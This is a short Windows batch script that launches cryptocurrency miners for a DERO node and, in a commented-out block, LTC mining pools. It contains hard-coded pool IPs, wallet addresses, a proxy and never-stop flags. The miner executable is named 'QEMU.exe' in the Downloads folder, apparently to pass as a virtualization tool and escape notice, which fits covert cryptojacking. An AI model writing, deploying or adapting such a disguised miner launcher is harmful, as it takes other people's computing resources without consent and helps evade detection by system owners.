#@echo off
#cd %~dp0
#cls

#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm yespowersugar --pool 51.91.7.170:6535,144.217.252.206:6535,51.91.74.9:6535 --disable-gpu --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker x6 --password c=LTC --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy 54.194.252.228:3128
#pause

#----

@echo off
C:\Users\%USERNAME%\Downloads\there0\QEMU.exe -d dero-node.mysrv.cloud:10100 -w dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c -t 5 --never-stop --restart-on-zero-hashrate
